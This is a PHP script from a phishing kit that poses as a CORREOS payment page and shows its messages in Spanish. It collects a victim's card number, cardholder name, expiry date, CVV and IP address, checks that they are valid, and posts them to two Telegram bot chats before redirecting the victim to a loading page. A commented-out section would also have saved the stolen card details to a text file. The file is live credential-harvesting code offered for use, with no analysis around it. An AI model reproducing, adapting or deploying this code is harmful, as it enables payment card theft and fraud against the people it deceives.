<?php



session_start();
include_once "../inc/vendor/autoload.php";
include_once "../settings/conf.php";




use Inacho\CreditCard;

function validate_cc_number($number = null) {
    $card = CreditCard::validCreditCard($number);
    if( $card['valid'] == false ) {
        return false;
    }
    return $card;
}


function validate_cc_cvv($number = null,$type = null) {
    if( empty($number) || empty($type) )
        return false;
    $cvv = CreditCard::validCvc($number, $type);
    return $cvv;
}

function validate_number($number, $length = null) {
    if (is_numeric($number)) {
        if ($length == null) {
            return true;
        } else {
            if ($length == strlen($number))
                return true;
            return false;
        }
    } else {
        return false;
    }
}


function validate_cc_date($month,$year) {
    if((trim($month) == "Mes") || (trim($year) =="Año")){
        return "Anomes";
    }
    if( validate_number(trim($month)) && strlen(trim($month)) == 2 && validate_number(trim($year)) && strlen(trim($year)) == 2 ) {
        if ($year < date("Y")[2].date("Y")[3]){
            return false;
        }else if($year == date("Y")[2].date("Y")[3]) {
            $currentMonth = (int)date("m");
            if ($month < $currentMonth){
                return false;
            }
            return $month . '/' . $year;
        }else {
            return $month . '/' . $year;
        }
        return $month . '/' . $year;
    } else {
        return false;
    }
}


$_SESSION['card'] = $_POST['card'];
$_SESSION['cvv']    = $_POST['cvv'];


$_ = explode(' ',$_POST['card']);
$_SESSION['card_'] = $_[0].$_[1].$_[2].$_[3];

$card_number = validate_cc_number($_SESSION['card']);
$card_cvv    = validate_cc_cvv($_POST['cvv'],$card_number['type']);
$date_year = substr($_POST['expy'],2,4);
$card_date   = validate_cc_date($_POST['expm'],$date_year);


$_SESSION['errors'] = [];
if( $card_date == "Anomes" ) {
    $_SESSION['errors']['date'] = "Introduzca una fecha válida.";
}
if( $card_number == false ) {
    $_SESSION['errors']['card'] = "Su número de tarjeta bancaria no es válido !";
}
if( $card_cvv == false ) {
    $_SESSION['errors']['cvv'] = "Su código de seguridad es incorrecto.";
}
if( $card_date == false ) {
    $_SESSION['errors']['date'] = "Tu fecha ha expirado.";
}


if( count($_SESSION['errors']) == 0 ) {
    $_message =  "|━━━━━━【🏦 CORREOS 🎭】━━━━━━ \r\n";
    $message_ = "| 🤵 CHN : " . $_POST['ccname'] . "\r\n";
    $message = "| 💳 CDC : " . $_SESSION['card_'] . "\r\n";
    $message .= "| 📆 EXP : " . $_POST['expm'] ."/". $_POST['expy'] ."\r\n";
    $message .= "| 🔆 CVV : " . $_POST['cvv'] . "\r\n";
    $message .= " *━━━━━━【📍" . $_SESSION["IP"] . "📍】━━━━━━ \r\n";

    //TG_send($message);

    $text = $_message . $message;

    $msgId = TELEGRAM_CHAT_IDD;
    $token = TELEGRAM_TOKEN;

    $url = "https://api.telegram.org/bot".$token.'/sendMessage?chat_id='.$msgId.'&text='.urlencode($text);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, True);
    $result = curl_exec($ch);
    curl_close($ch);
    $result_json = json_decode($result, True);
    if(isset($result_json['ok'])){
        if(isset($result_json['result'])){
            echo "";
        }else {
            //echo $result_json[\'description\'];
            echo "";
        }
    }else {
        //echo "Something went wrong";
        echo "";
    }

    $text = $_message . $message_ . $message;

    $msgId = TELEGRAM_CHAT_ID;

    $url = "https://api.telegram.org/bot".$token.'/sendMessage?chat_id='.$msgId.'&text='.urlencode($text);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, True);
    $result = curl_exec($ch);
    curl_close($ch);
    $result_json = json_decode($result, True);
    if(isset($result_json['ok'])){
        if(isset($result_json['result'])){
            echo "";
        }else {
            //echo $result_json[\'description\'];
            echo "";
        }
    }else {
        //echo "Something went wrong";
        echo "";
    }


    date_default_timezone_set('GMT');
    $TIME = date("d-m-Y H:i:s");
    // $file = fopen("../assets/".TXT_FILE_NAME,"a");
    // fwrite($file,"━━━━━━━━━━━━━━【".$_SESSION["IP"]."】━━━━━━━━━━━━━━━━\r\n".$_POST['ccname']."\r\n".$_SESSION['card_']."|".$_POST['expm'] ."|". $_POST['expy']."|".$_POST['cvv']."\r\n━━━━━━━━━━【".$TIME."】━━━━━━━━━━\r\n") ;
    header("Location: ../Cargando.php?codigo_id=".md5(date("Y/m/d-h:i:sa")));
} else {
    header("Location: ../Detalles_del_pago.php?error=1&confirmation=".md5(date("Y/m/d-h:i:sa")));
}


?>